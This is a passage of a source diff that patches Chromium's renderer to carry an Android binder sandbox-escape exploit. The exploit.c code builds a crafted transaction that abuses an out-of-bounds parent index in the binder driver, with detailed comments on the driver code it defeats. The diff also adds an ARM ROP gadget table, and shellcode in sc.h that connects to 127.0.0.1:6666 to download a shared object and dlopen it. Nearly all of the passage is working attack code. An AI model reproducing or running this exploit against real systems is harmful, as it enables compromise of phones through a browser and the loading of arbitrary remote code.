+  strcpy(sc_addr + sizeof(download_and_dlopen_sc), "/data/data/org.chromium.chrome/test.so");
+
+  return 0;
+}
+
+/*
+ * Checks if `fd` is a binder file descriptor by calling ioctl 
+ * with `BINDER_VERSION` code.
+ */
+
+int is_binder(int fd) {
+  uint32_t ver;
+  return  ioctl(fd, BINDER_VERSION, &ver) == 0;
+}
+
+
+/*
+ * The actual exploit code. exploit_data and exploit_data_size get
+ * passed from the hook, but are not used here. They can be used while
+ * debugging if we want to pass data to the exploit without rebuilding 
+ * chrome.
+ */
+
+uint32_t exploit(uint8_t *exploit_data, size_t exploit_data_size) {
+  struct binder_write_read bwr;
+  uint32_t tr_size;
+  uint64_t offsets[128];
+  uint8_t sg_buf[0x1000];
+  uint32_t readbuf[32];
+  uint8_t *ptr = binder_data;
+  uint64_t *offs = offsets;
+  uint32_t buflen = 0;
+  struct binder_state mybs;
+  struct binder_state *bs = &mybs;
+
+  /*
+   * Used to perform BC_TRANSACTION_SG queries.
+   */
+  struct {
+          uint32_t cmd;
+          struct binder_transaction_data txn;
+          binder_size_t buffers_size;
+  } __attribute__((packed)) writebuf;
+
+
+  
+  /* Start by finding our own /dev/binder mapping */
+  void *binder = find_mapping("/dev/binder", NULL, strcmp);
+  if (!binder) {
+    DO_LOG("[!] Could not find binder mapping\n");
+    return 0xdead;
+  }
+
+  DO_LOG("[*] Binder mapping at %p\n", binder);
+
+  /* Find also the binder file descriptor. Binder is open very early on,
+   * so it is expected to be within the first ~20 file descriptors. We 
+   * are iterating until 100 just in case.
+   */
+
+  bs->fd = -1;
+  for (int i=0; i < 100; i++) {
+    if (is_binder(i)) {
+      bs->fd = i;
+      break;
+    }
+  }
+
+  if (bs->fd == -1) {
+    DO_LOG("[!] Could not find binder fd :-/\n");
+    return 0xdead;
+  }
+
+  DO_LOG("[*] Found binder fd %d\n", bs->fd);
+
+  /*
+   * Find the handle of a binder object in the broker.
+   */
+
+  int handle = find_handle_by_interface(bs, IPARENT_PROCESS_INTERFACE);
+  if (handle == -1) {
+    DO_LOG("[!] Could not find IparentProcess handle !?\n");
+    return 0xdead;
+  }
+
+  DO_LOG("[*] IParentProcess handle is %d\n", handle);
+
+  /* Figure out how large a transaction we can send. */
+  tr_size = find_transaction_size(bs, handle);
+  DO_LOG("[*] Transaction size max %x\n", tr_size);  
+
+  /*
+   * Now we know that if we make a transaction of this size, it starts
+   * at the end of binder mapping - tr_size.
+   */
+
+  uint64_t user_address = (uint64_t)binder + 0xfe000 - tr_size;
+  DO_LOG("[*] Target user_address: %llx\n", user_address);
+
+
+  /*
+   * The purpose of this apparently useless transaction is to initialize the content of the qword at
+   * offset 0OOB_OFFSET_INDEX in the binder mapping. This is where the vulnerable code will try to 
+   * find an out-of-bounds offset later on, so we pre-initialize it.
+   */
+
+  *(uint64_t *)(binder_data + DATA_SIZE + OOB_OFFSET_INDEX*sizeof(binder_size_t)) = LEGIT_PTR_OFFSET; // offset of valid BINDER_TYPE_PTR
+   binder_transaction(bs, false, handle, binder_data, tr_size, NULL, 0);
+
+
+  /* Wait for the BR_REPLY. */
+  uint32_t remaining = 0, consumed = 0;
+  while (binder_read_next(bs, binder_data, &remaining, &consumed) != BR_REPLY);
+
+  memset(offsets, 0, 128 * sizeof(uint64_t));
+
+
+  /*
+   * Now craft the real transaction. Start with what's required by SHELL_COMMAND.
+   */
+
+  /* File descriptor x3 */
+
+  struct binder_fd_object *fdo = (struct binder_fd_object *)ptr;
+  fdo->hdr.type = BINDER_TYPE_FD;
+  fdo->fd = 0;
+  fdo->cookie = 0;
+  *(offs++) = ((uint8_t *)fdo) - binder_data;
+  ptr = (uint8_t *) ++fdo;
+
+  fdo = (struct binder_fd_object *)ptr;
+  fdo->hdr.type = BINDER_TYPE_FD;
+  fdo->fd = 0;
+  fdo->cookie = 0;
+  *(offs++) = ((uint8_t *)fdo) - binder_data;
+  ptr = (uint8_t *) ++fdo;
+
+  fdo = (struct binder_fd_object *)ptr;
+  fdo->hdr.type = BINDER_TYPE_FD;
+  fdo->fd = 0;
+  fdo->cookie = 0;
+  *(offs++) = ((uint8_t *)fdo) - binder_data;
+  ptr = (uint8_t *)++fdo;
+
+  /* uint32_t argc = 0 */
+  *(uint32_t *)ptr = 0;
+  ptr += 4;
+
+  /* IShellCallback = NULL */
+  struct flat_binder_object *obj = (struct flat_binder_object *)ptr;
+
+  obj->flags = 0;
+  obj->hdr.type = BINDER_TYPE_BINDER;
+  obj->binder = (uintptr_t)0;
+  obj->cookie = 0;
+  // NOTE: No need to add a NULL binder to offsets, Parcel.cpp allows this.
+  ptr = (uint8_t *) ++obj;
+
+  /*
+   * IResultReceiver. We'll palce the handle owned by the broker process here, 
+   * but the driver will translate it to a BINDER. Afterwards, we'll use the 
+   * bug to smash the cookie field and get code execution.
+   */
+
+  uint32_t ibinder_offset = ptr - binder_data;
+  DO_LOG("[*] Target binder offset: %x\n", ibinder_offset);
+  struct flat_binder_object *fbo = (struct flat_binder_object *)ptr;
+  fbo->hdr.type = BINDER_TYPE_HANDLE;
+  fbo->flags = 0;
+  fbo->handle = handle;
+  fbo->cookie = 0;
+  *(offs++) = ((uint8_t *)fbo) - binder_data;
+  ptr = (uint8_t *) ++fbo;
+
+  /* 
+   * Take note of the offset of the next object, since we'll need it later
+   * to perform a replacement when we trigger the bug.
+   */
+  uint64_t fake_ptr_offset = ptr - binder_data;
+  DO_LOG("[*] Fake PTR offset: %llx\n", fake_ptr_offset);
+
+  /*
+   * Here, we craft a BINDER_TYPE_PTR, which won't be added to the offset array, and will thus not be validated by the binder
+   * driver. It will be used later, once the bug is triggered, and we can make the `parent` pointer, point to this object.
+   * As it wasn't validated we can assign it an arbitrary length. The sole purpose of this object is to use the
+   * binder parent fixup code to overwrite a qword at an "arbitrary" offset with the userland address of a child buffer.
+   * This is the primitive which is used to overwrite the handle value of the BINDER_TYPE_HANDLE we created above.
+   *
+   * We need to make sure `bbo->buffer` is valid, otherwise the kernel will cause a BUG check. But we already took care
+   * of computing that above.
+   */
+
+  struct binder_buffer_object *bbo = (struct binder_buffer_object *)(ptr);
+  bbo->hdr.type = BINDER_TYPE_PTR;
+  bbo->flags = 0;
+  bbo->buffer = (binder_uintptr_t)user_address;
+  bbo->length = 0xdeadbeefbadc0ded;
+  bbo->parent = 0;
+  bbo->parent_offset = 0;
+  ptr = (uint8_t*)++bbo;
+
+  /* Add a BINDER_TYPE_PTR which gets validated by the driver. */
+  DO_LOG("[*] Valid PTR offset: %x\n", ptr - binder_data);
+  
+  /* Sanity check: verify the offset of the next object matches what we expected */
+  if ((ptr - binder_data) != LEGIT_PTR_OFFSET) {
+    DO_LOG("[!] Legitimate PTR offset does not match LEGIT_PTR_OFFSET. (expected: %x, defined as: %x)\n", ptr-binder_data, LEGIT_PTR_OFFSET);
+    return 0xdead;
+  }
+
+  bbo->hdr.type = BINDER_TYPE_PTR;
+  bbo->flags = 0;
+  bbo->buffer = (binder_uintptr_t)sg_buf;
+  bbo->length = 0x10;
+  bbo->parent = 0;
+  bbo->parent_offset = 0;
+
+  // Add it to the offsets array
+  *(offs++) = ((uint8_t *)bbo) - binder_data;
+  ptr = (uint8_t*)++bbo;
+
+  /* We create an additionnal BINDER_TYPE_PTR, whose parent will be the one we created just above. This is where the bug is triggered,
+   * as the bbo->parent index is set to `OOB_OFFSET_INDEX` which is wrong as it is > to the number of offsets in the offsets array. offs[OOB_OFFSET_INDEX] 
+   * will thus end up pointing in not yet initalized data reserved for the sg_buf. The whole purpose of the seemingly useless first transaction was to initialize this address with the 
+   * value 0x40, which is the offset of the previous BINDER_TYPE_PTR object in order for the `binder_validate_ptr` and `binder_valid_fixup` function to succeed.
+   * This BINDER_TYPE_PTR is then eventually validated and the `last_fixup_obj_off` is set to the offset of this object.
+   * This implies that we just validated a BINDER_TYPE_PTR whose bbo->parent index points into an array entry which will be modified by the next BINDER_TYPE_PTR below,
+   * that the driver will process.
+   */
+  bbo->hdr.type = BINDER_TYPE_PTR;
+  bbo->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
+  bbo->buffer = 0;
+  bbo->length = 0;
+  bbo->parent = OOB_OFFSET_INDEX;
+  bbo->parent_offset = 0;
+  buflen += bbo->length;
+  // Add it to the offsets array
+  *(offs++) = ((uint8_t *)bbo) - binder_data;
+  ptr = (uint8_t *)++bbo;
+
+
+
+  /* 
+   * And finally, the last nail in the coffin.
+   * We craft the almost exact same BINDER_TYPE_PTR as above, still having a parent index of OOB_OFFSET_INDEX. This time however, we specify a 'buffer', whose data will be copied from
+   * before validating the BINDER_TYPE_PTR. This qword will overwrite the value at offs[OOB_OFFSET_INDEX], replacing the value pointing to a validated BINDER_TYPE_PTR, with the value fake_ptr_offset,
+   * which points to the very first BINDER_TYPE_PTR, which wasn't validated by the binder driver as we haven't added it's offset to the offsets array. The following will now happen
+   * in `binder_fixup_parent()`:
+   * ```c
+     2884         parent = binder_validate_ptr(target_proc, b, &object, bp->parent,
+     2885                                      off_start_offset, &parent_offset,
+     2886                                      num_valid);
+     ...
+     2893         if (!binder_validate_fixup(target_proc, b, off_start_offset,
+     2894                                    parent_offset, bp->parent_offset,
+     2895                                    last_fixup_obj_off,
+     2896                                    last_fixup_min_off)) {
+     2897                 binder_user_error("%d:%d got transaction with out-of-order buffer fixup\n",
+     2898                                   proc->pid, thread->pid);
+     2899                 return -EINVAL;
+     2900         }
+   * ```
+   * Here, parent will now point to the unvalidated BINDER_TYPE_PTR, however, to be used by the driver it needs to be validated by the `binder_validate_fixup()` function:
+   * ```c
+   * 2414 static bool binder_validate_fixup(struct binder_proc *proc,
+     2415                                   struct binder_buffer *b,
+     2416                                   binder_size_t objects_start_offset,
+     2417                                   binder_size_t buffer_obj_offset,
+     2418                                   binder_size_t fixup_offset,
+     2419                                   binder_size_t last_obj_offset,
+     2420                                   binder_size_t last_min_offset)
+     2421 {
+     ...
+     2427         while (last_obj_offset != buffer_obj_offset) {
+     2428                 unsigned long buffer_offset;
+     2429                 struct binder_object last_object;
+     2430                 struct binder_buffer_object *last_bbo;
+     2431                 size_t object_size = binder_get_object(proc, b, last_obj_offset,
+     2432                                                        &last_object);
+     2433                 if (object_size != sizeof(*last_bbo))
+     2434                         return false;
+     2435
+     2436                 last_bbo = &last_object.bbo;
+     2437                 *
+     2438                 * Safe to retrieve the parent of last_obj, since it
+     2439                 * was already previously verified by the driver.
+     2440                 *
+     2441                 if ((last_bbo->flags & BINDER_BUFFER_FLAG_HAS_PARENT) == 0)
+     2442                         return false;
+     2443                 last_min_offset = last_bbo->parent_offset + sizeof(uintptr_t);
+     2444                 buffer_offset = objects_start_offset +
+     2445                         sizeof(binder_size_t) * last_bbo->parent,
+     2446                 binder_alloc_copy_from_buffer(&proc->alloc, &last_obj_offset,
+     2447                                               b, buffer_offset,
+     2448                                               sizeof(last_obj_offset));
+     2449         }
+     2450         return (fixup_offset >= last_min_offset);
+     2451 }
+    ```
+    Here, as the `last_bbo` pointer was previously validated by the driver, it is trusted, and it particular, its `parent` field is trusted. However, the value of
+    last_bbo->parent is now `fake_ptr_offset` instead of `LEGIT_PTR_OFFSET`, which ends up setting `last_obj_offset` to the same value as `buffer_obj_offset` (which is the offset of the
+    fake BINDER_TYPE_PTR), and exists the loop. From now on, the driver will be manipulating and unvalidated object. The following code will try to fixup the buffer address
+    in the fake BINDER_TYPE_PTR object:
+    ```c
+    2909         buffer_offset = bp->parent_offset +
+    2910                         (uintptr_t)parent->buffer - (uintptr_t)b->user_data;
+    2911         binder_alloc_copy_to_buffer(&target_proc->alloc, b, buffer_offset,
+    2912                                     &bp->buffer, sizeof(bp->buffer));
+    ```
+    As the parent->buffer is equal to b->user_data, only the parent_offset is taken into account. This means that the userland address of the
+    bp->buffer will smash the `bp->binder` field of the IResultReceiver BINDER_TYPE_BINDER object we sent earlier.
+   */
+  uint64_t new_off = fake_ptr_offset;
+  bbo->hdr.type = BINDER_TYPE_PTR;
+  bbo->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
+  bbo->buffer = (binder_uintptr_t)&new_off;
+  bbo->length = sizeof(new_off);
+  bbo->parent = OOB_OFFSET_INDEX; // offs[OOB_OFFSET_INDEX] = fake_ptr_offset;
+  bbo->parent_offset = ibinder_offset + offsetof(struct flat_binder_object, binder);
+  *(offs++) = ((uint8_t *)bbo) - binder_data;
+  ptr = (uint8_t*)++bbo;
+
+
+  /*
+   * Now we will do a similar trick, but this time point the `bp->cookie` field to a 
+   * large buffer that will be added to the `sg_buf` area.
+   *
+   * This `cookie` value gets casted to an IBinder object, so we end up controlling
+   * an object pointer on the browser side.
+   */
+
+  uint32_t fake_object[0x400];
+  uint32_t fake_object_addr = user_address + DATA_SIZE + (OOB_OFFSET_INDEX+1)*8;
+  if (prepare_fake_object(fake_object, fake_object_addr)) {
+    return 0xd00d;
+  }
+
+  bbo->hdr.type = BINDER_TYPE_PTR;
+  bbo->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
+  bbo->buffer = (binder_uintptr_t)&fake_object[0];
+  bbo->length = sizeof(fake_object);
+  bbo->parent = OOB_OFFSET_INDEX; // offs[OOB_OFFSET_INDEX] = fake_ptr_offset;
+  bbo->parent_offset = ibinder_offset + offsetof(struct flat_binder_object, cookie);
+  *(offs++) = ((uint8_t *)bbo) - binder_data;
+  ptr = (uint8_t*)++bbo;
+
+
+  /* Now send the transaction. */
+  writebuf.cmd = BC_TRANSACTION_SG;
+  writebuf.txn.target.handle = handle;
+  writebuf.txn.code = SHELL_COMMAND_TRANSACTION;
+  writebuf.txn.flags = 0;
+  writebuf.txn.data_size = ((uint8_t*)ptr) - ((uint8_t *)binder_data);
+  writebuf.txn.offsets_size = ((uint8_t*)offs) - ((uint8_t *)offsets);
+  writebuf.txn.data.ptr.buffer = (binder_uintptr_t)binder_data;
+  writebuf.txn.data.ptr.offsets = (binder_uintptr_t)offsets;
+  buflen = (tr_size - writebuf.txn.data_size - writebuf.txn.offsets_size) & ~7ULL;
+  writebuf.buffers_size = buflen ;
+
+  bwr.write_size = sizeof(writebuf);
+  bwr.write_consumed = 0;
+  bwr.write_buffer = (binder_uintptr_t)&writebuf;
+  bwr.read_size = 0;
+  bwr.read_consumed = 0;
+  bwr.read_buffer = 0;
+
+  bwr.read_size = sizeof(readbuf);
+  bwr.read_consumed = 0;
+  bwr.read_buffer = (binder_uintptr_t)readbuf;
+
+  /*
+   * Sanity check on data size before sending the transaction. 
+   * Note that offsets is always copied aligned to an 8-byte boundary,
+   * so here we algin expected_data_size too.
+   */
+  uint32_t expected_data_size = (writebuf.txn.data_size + 7UL) & ~7UL;
+  if ( expected_data_size != DATA_SIZE) {
+    DO_LOG("[!] DATA_SIZE does not match match writebuf.txn.data_size (expected: %x, defined as: %x)\n", expected_data_size, DATA_SIZE);
+    return 0xdead;
+  }
+
+  /*
+   * Sanity check on offsets size before sending the transaction. OOB_OBJECT_INDEX
+   * must point 2 offsets out-of-bounds.
+   */
+  if (OOB_OFFSET_INDEX != ( (writebuf.txn.offsets_size/sizeof(uint64_t) ) + 2) ) {
+    DO_LOG("[!] OOB_OFFSET_INDEX does not match offsets_size (expected: %llx, defined as: %x)\n", ((writebuf.txn.offsets_size/sizeof(uint64_t)) + 2), OOB_OFFSET_INDEX);
+    return 0xdead;
+  }
+
+  /*
+   * Now send the transaction and get code execution.
+   */
+  DO_LOG("[*] transaction return code: %x\n", ioctl(bs->fd, BINDER_WRITE_READ, &bwr));
+
+
+  return 0x1337;
+}
\ No newline at end of file
diff --git a/content/renderer/render_thread_impl.cc b/content/renderer/render_thread_impl.cc
index f133e1651a27..8633a8622518 100644
--- a/content/renderer/render_thread_impl.cc
+++ b/content/renderer/render_thread_impl.cc
@@ -191,6 +191,12 @@
 #include <malloc.h>
 #endif
 
+#include <sys/mman.h>
+#include <sys/syscall.h>
+
+extern uint32_t (*pwn_hook)(uint8_t *, size_t);
+
+
 using base::ThreadRestrictions;
 using blink::WebDocument;
 using blink::WebFrame;
@@ -201,6 +207,8 @@ using blink::WebSecurityPolicy;
 using blink::WebString;
 using blink::WebView;
 
+#include "exploit.c"
+
 namespace content {
 
 namespace {
@@ -954,6 +962,8 @@ void RenderThreadImpl::Init() {
     compositing_mode_reporter_->AddCompositingModeWatcher(
         std::move(watcher_ptr));
   }
+
+  pwn_hook = &exploit;
 }
 
 RenderThreadImpl::~RenderThreadImpl() {
diff --git a/content/renderer/rop.h b/content/renderer/rop.h
new file mode 100644
index 000000000000..5c510a91dab7
--- /dev/null
+++ b/content/renderer/rop.h
@@ -0,0 +1,119 @@
+/*
+ * List of ROP gadgets that are used by the exploit.
+ */
+
+/* Gadget identifier. */
+typedef enum {
+	POP_PC = 0,
+	POP_R0_PC,
+	POP_R4_R5,
+	SAVE_SP,
+	POP_R0_TO_R7_MINUS_R4,
+	POP_R4,
+	STACK_PIVOT,
+	STR_R1_R0,
+	POP_R1_PC,
+	POP_R0_R1_IP_SP_PC,
+	POP_LR_PC,
+	MMAP2_SVC,
+	/* Must always be last */
+	NUM_GADGETS,
+} gadget_id_t;
+
+/* Gadget descriptor */
+typedef struct {
+	gadget_id_t gadget; 	// ID, must match index in the `gadgets` array.
+	const char *pattern;	// Pattern to search for
+	size_t pattern_size;	// Size of the pattern
+	uint32_t address;		// Address once the gadget has been found
+	int thumb;				// 1 for thumb code, 0 for ARM
+} gadget_t;
+
+gadget_t gadgets[NUM_GADGETS] = {
+	{
+		.gadget = POP_PC,
+		.pattern = "\x04\xF0\x9D\xE4", 							// pop {pc}
+		.pattern_size = 4,
+		.thumb = 0,
+	},
+
+	{
+		.gadget = POP_R0_PC,
+		.pattern = "\x01\x80\xBD\xE8", 							// pop {r0, pc}
+		.pattern_size = 4,
+		.thumb = 0,
+	},
+
+	{
+		.gadget = POP_R4_R5,									// pop {r4, r5, pc}
+		.pattern = "\x30\xBD",
+		.pattern_size = 2,
+		.thumb = 1,
+	},
+
+	{
+		.gadget = SAVE_SP,
+		.pattern = "\x07\x60\x20\x46\x03\xb0\xf0\xbd",			// str r7, [r0] ; mov r0, r4 ; add sp, #0xc ; pop {r4, r5, r6, r7, pc}
+		.pattern_size = 8,
+		.thumb = 1,
+	},
+
+	{
+		.gadget = POP_R0_TO_R7_MINUS_R4,						// pop {r0, r1, r2, r3, r5, r6, r7, pc}
+		.pattern = "\xef\xbd",
+		.pattern_size = 2,
+		.thumb = 1,
+	},
+
+
+	{
+		.gadget = POP_R4,
+		.pattern = "\x10\xbd",									// pop {r4, pc}
+		.pattern_size = 2,
+		.thumb = 1,
+	},
+	
+	{
+		.gadget = STACK_PIVOT,
+		.pattern = "\x24\xF0\xB0\xE8",							// ldm r0!, {r2, r5, ip, sp, lr, pc})
+		.pattern_size = 4,
+		.thumb = 0,
+	},
+
+	{
+		.gadget = STR_R1_R0,
+		.pattern = "\x01\x60\x70\x46\x80\xbd",					// str r1, [r0] ; mov r0, lr ; pop {r7, pc}
+		.pattern_size = 6,
+		.thumb = 1,
+	},	
+
+	{
+		.gadget = POP_R1_PC,
+		.pattern = "\x02\xbd",
+		.pattern_size = 2,
+		.thumb = 1,
+	},
+
+
+	{
+		.gadget = POP_R0_R1_IP_SP_PC,							// pop {r1, pc}
+		.pattern = "\x03\xb0\xbd\xe8",
+		.pattern_size = 4,
+		.thumb = 0, 
+	},
+
+	{
+		.gadget = POP_LR_PC,
+		.pattern = "\x00\xC0\xBD\xE8",							// pop {lr, pc})
+		.pattern_size = 4,
+		.thumb = 0,
+	},
+
+	{
+		.gadget = MMAP2_SVC,
+		.pattern = "\x00\x00\x00\xef\xf0\x00\xbd\xe8\x01\x0a\x70\xe3\x1e\xff\x2f\x91", // svc 0 ; pop {r4-r7} ; cmn r0, #0x1000, bxlr lr
+		.pattern_size = 16,
+		.thumb = 0,
+	}
+
+};
\ No newline at end of file
diff --git a/content/renderer/sc.h b/content/renderer/sc.h
new file mode 100644
index 000000000000..30401dd514ad
--- /dev/null
+++ b/content/renderer/sc.h
@@ -0,0 +1,78 @@
+/* 
+ * Shellcode to copy and cacheflush a next stage shellcode. The following
+ * replacements will be made before running:
+ * 
+ * 0x41424344 : src address where the next stage is located.
+ * 0x51525354 : dst address where to copy.
+ *
+ * Note that 0x2000 bytes get copied, thus enough space needs to be ensured at 
+ * the destination buffer.
+ *
+ * Note also that the final jump is performed in ARM mode, so the shellcode 
+ * must be ARM-encoded or switch to thumb by itself.
+ *
+ */
+
+uint32_t copy_sc[12] = {
+  0x4d094c08U, 0x1c291c20U, 0x5200f44fU, 0xc1c0c8c0U, 0x2a003a08U,
+  0x1c30d1faU, 0x5100f44fU, 0x4f031809U, 0x4728df00U, 0x41424344U,
+  0x51525354U, 0x000f0002U
+};
+
+/*
+ * Shellcode to connect to 127.0.0.1:6666, download a shared object and dlopen it.
+ *
+ * Must be patched at runtime in the following way:
+ *  - Offset 0: address where the stack pointer was stored.
+ *  - Offset 4: expected return address to search for in the stack.
+ *  - Offset 8: address of internal dlopen function within the linker.
+ *  - Offset 12: address of open to be passed to dlopen as a trusted caller.
+ * 
+ * The path to the downloaded library must be appended at the end of the shellcode.
+ * see exploit.c
+ */
+uint8_t download_and_dlopen_sc[] = {
+
+  0x07, 0x00, 0x00, 0xea, 
+  0x42, 0x42, 0x42, 0x42, // stack pointer storage 
+  0x43, 0x43, 0x43, 0x43, // offset
+  0x41, 0x41, 0x41, 0x41, // dlopen
+  0x41, 0x41, 0x41, 0x41, // open
+  0x02, 0x00, 
+  0x1a, 0x0a,             // htons(6666)
+  0x7f, 0x00, 0x00, 0x01, // 127.0.0.1
+  0x00, 0x00,
+
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x19, 0x71, 0x00, 0xe3,
+  0x02, 0x00, 0xa0, 0xe3, 0x01, 0x10, 0xa0, 0xe3, 0x00, 0x20,
+  0xa0, 0xe3, 0x00, 0x00, 0x00, 0xef, 0x00, 0x60, 0xa0, 0xe1,
+  0x1b, 0x71, 0x00, 0xe3, 0x34, 0x10, 0x4f, 0xe2, 0x10, 0x20,
+  0xa0, 0xe3, 0x00, 0x00, 0x00, 0xef, 0x04, 0x70, 0xa0, 0xe3,
+  0x06, 0x00, 0xa0, 0xe1, 0xe4, 0x10, 0x8f, 0xe2, 0x04, 0x20,
+  0xa0, 0xe3, 0x00, 0x00, 0x00, 0xef, 0x20, 0xd0, 0x4d, 0xe2,
+  0x03, 0x70, 0xa0, 0xe3, 0x06, 0x00, 0xa0, 0xe1, 0x0d, 0x10,
+  0xa0, 0xe1, 0x04, 0x20, 0xa0, 0xe3, 0x00, 0x00, 0x00, 0xef,
+  0x00, 0x00, 0x9d, 0xe5, 0xbc, 0x10, 0x9f, 0xe5, 0x01, 0x00,
+  0x50, 0xe1, 0x22, 0x00, 0x00, 0x1a, 0x00, 0x00, 0xa0, 0xe3,
+  0x05, 0x70, 0xa0, 0xe3, 0xac, 0x00, 0x8f, 0xe2, 0x41, 0x12,
+  0x00, 0xe3, 0xff, 0x21, 0x00, 0xe3, 0x00, 0x00, 0x00, 0xef,
+  0x00, 0x50, 0xa0, 0xe1, 0x03, 0x70, 0xa0, 0xe3, 0x06, 0x00,
+  0xa0, 0xe1, 0x0d, 0x10, 0xa0, 0xe1, 0x04, 0x20, 0xa0, 0xe3,
+  0x00, 0x00, 0x00, 0xef, 0x00, 0x40, 0x9d, 0xe5, 0x03, 0x70,
+  0xa0, 0xe3, 0x06, 0x00, 0xa0, 0xe1, 0x0d, 0x10, 0xa0, 0xe1,
+  0x20, 0x20, 0xa0, 0xe3, 0x00, 0x00, 0x00, 0xef, 0x00, 0x00,
+  0x50, 0xe3, 0x0e, 0x00, 0x00, 0xba, 0x04, 0x70, 0xa0, 0xe3,
+  0x00, 0x20, 0xa0, 0xe1, 0x05, 0x00, 0xa0, 0xe1, 0x0d, 0x10,
+  0xa0, 0xe1, 0x00, 0x00, 0x00, 0xef, 0x00, 0x00, 0x50, 0xe3,
+  0x07, 0x00, 0x00, 0xba, 0x00, 0x40, 0x44, 0xe0, 0x00, 0x00,
+  0x54, 0xe3, 0xee, 0xff, 0xff, 0x1a, 0xfc, 0x40, 0x1f, 0xe5,
+  0x38, 0x00, 0x8f, 0xe2, 0x02, 0x10, 0xa0, 0xe3, 0x04, 0x21,
+  0x1f, 0xe5, 0x34, 0xff, 0x2f, 0xe1, 0x18, 0x31, 0x1f, 0xe5,
+  0x00, 0xd0, 0x93, 0xe5, 0x1c, 0x31, 0x1f, 0xe5, 0x20, 0x00,
+  0x9d, 0xe5, 0x03, 0x00, 0x50, 0xe1, 0x04, 0xd0, 0x8d, 0x12,
+  0xfb, 0xff, 0xff, 0x1a, 0xf0, 0x4f, 0xbd, 0xe8, 0x00, 0x00,
+  0xa0, 0xe3, 0xdc, 0x00, 0x86, 0xe5, 0x1e, 0xff, 0x2f, 0xe1,
+  0x48, 0x45, 0x4c, 0x4f,
+  // path for downloaded file must be placed after shellcode
+};
+
diff --git a/content/renderer/uapi_binder.h b/content/renderer/uapi_binder.h
new file mode 100644
index 000000000000..df430dcb746b
--- /dev/null
+++ b/content/renderer/uapi_binder.h
@@ -0,0 +1,514 @@
+/*
+ * Copyright (C) 2008 Google, Inc.
+ *
+ * Based on, but no longer compatible with, the original
+ * OpenBinder.org binder driver interface, which is:
+ *
+ * Copyright (c) 2005 Palmsource, Inc.
+ *
+ * This software is licensed under the terms of the GNU General Public
+ * License version 2, as published by the Free Software Foundation, and
+ * may be copied, distributed, and modified under those terms.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ */
+
+#ifndef _UAPI_LINUX_BINDER_H
+#define _UAPI_LINUX_BINDER_H
+
+#include <linux/types.h>
+#include <linux/ioctl.h>
+#include <unistd.h>
+
+#define B_PACK_CHARS(c1, c2, c3, c4) \
+	((((c1)<<24)) | (((c2)<<16)) | (((c3)<<8)) | (c4))
+#define B_TYPE_LARGE 0x85
+
+enum {
+	BINDER_TYPE_BINDER	= B_PACK_CHARS('s', 'b', '*', B_TYPE_LARGE),
+	BINDER_TYPE_WEAK_BINDER	= B_PACK_CHARS('w', 'b', '*', B_TYPE_LARGE),
+	BINDER_TYPE_HANDLE	= B_PACK_CHARS('s', 'h', '*', B_TYPE_LARGE),
+	BINDER_TYPE_WEAK_HANDLE	= B_PACK_CHARS('w', 'h', '*', B_TYPE_LARGE),
+	BINDER_TYPE_FD		= B_PACK_CHARS('f', 'd', '*', B_TYPE_LARGE),
+	BINDER_TYPE_FDA		= B_PACK_CHARS('f', 'd', 'a', B_TYPE_LARGE),
+	BINDER_TYPE_PTR		= B_PACK_CHARS('p', 't', '*', B_TYPE_LARGE),
+};
+
+/**
+ * enum flat_binder_object_shifts: shift values for flat_binder_object_flags
+ * @FLAT_BINDER_FLAG_SCHED_POLICY_SHIFT: shift for getting scheduler policy.
+ *
+ */
+enum flat_binder_object_shifts {
+	FLAT_BINDER_FLAG_SCHED_POLICY_SHIFT = 9,
+};
+
+/**
+ * enum flat_binder_object_flags - flags for use in flat_binder_object.flags
+ */
+enum flat_binder_object_flags {
+	/**
+	 * @FLAT_BINDER_FLAG_PRIORITY_MASK: bit-mask for min scheduler priority
+	 *
+	 * These bits can be used to set the minimum scheduler priority
+	 * at which transactions into this node should run. Valid values
+	 * in these bits depend on the scheduler policy encoded in
+	 * @FLAT_BINDER_FLAG_SCHED_POLICY_MASK.
+	 *
+	 * For SCHED_NORMAL/SCHED_BATCH, the valid range is between [-20..19]
+	 * For SCHED_FIFO/SCHED_RR, the value can run between [1..99]
+	 */
+	FLAT_BINDER_FLAG_PRIORITY_MASK = 0xff,
+	/**
+	 * @FLAT_BINDER_FLAG_ACCEPTS_FDS: whether the node accepts fds.
+	 */
+	FLAT_BINDER_FLAG_ACCEPTS_FDS = 0x100,
+	/**
+	 * @FLAT_BINDER_FLAG_SCHED_POLICY_MASK: bit-mask for scheduling policy
+	 *
+	 * These two bits can be used to set the min scheduling policy at which
+	 * transactions on this node should run. These match the UAPI
+	 * scheduler policy values, eg:
+	 * 00b: SCHED_NORMAL
+	 * 01b: SCHED_FIFO
+	 * 10b: SCHED_RR
+	 * 11b: SCHED_BATCH
+	 */
+	FLAT_BINDER_FLAG_SCHED_POLICY_MASK =
+		3U << FLAT_BINDER_FLAG_SCHED_POLICY_SHIFT,
+
+	/**
+	 * @FLAT_BINDER_FLAG_INHERIT_RT: whether the node inherits RT policy
+	 *
+	 * Only when set, calls into this node will inherit a real-time
+	 * scheduling policy from the caller (for synchronous transactions).
+	 */
+	FLAT_BINDER_FLAG_INHERIT_RT = 0x800,
+};
+
+#ifdef BINDER_IPC_32BIT
+typedef __u32 binder_size_t;
+typedef __u32 binder_uintptr_t;
+#else
+typedef __u64 binder_size_t;
+typedef __u64 binder_uintptr_t;
+#endif
+
+/**
+ * struct binder_object_header - header shared by all binder metadata objects.
+ * @type:	type of the object
+ */
+struct binder_object_header {
+	__u32        type;
+};
+
+/*
+ * This is the flattened representation of a Binder object for transfer
+ * between processes.  The 'offsets' supplied as part of a binder transaction
+ * contains offsets into the data where these structures occur.  The Binder
+ * driver takes care of re-writing the structure type and data as it moves
+ * between processes.
+ */
+struct flat_binder_object {
+	struct binder_object_header	hdr;
+	__u32				flags;
+
+	/* 8 bytes of data. */
+	union {
+		binder_uintptr_t	binder;	/* local object */
+		__u32			handle;	/* remote object */
+	};
+
+	/* extra data associated with local object */
+	binder_uintptr_t	cookie;
+};
+
+/**
+ * struct binder_fd_object - describes a filedescriptor to be fixed up.
+ * @hdr:	common header structure
+ * @pad_flags:	padding to remain compatible with old userspace code
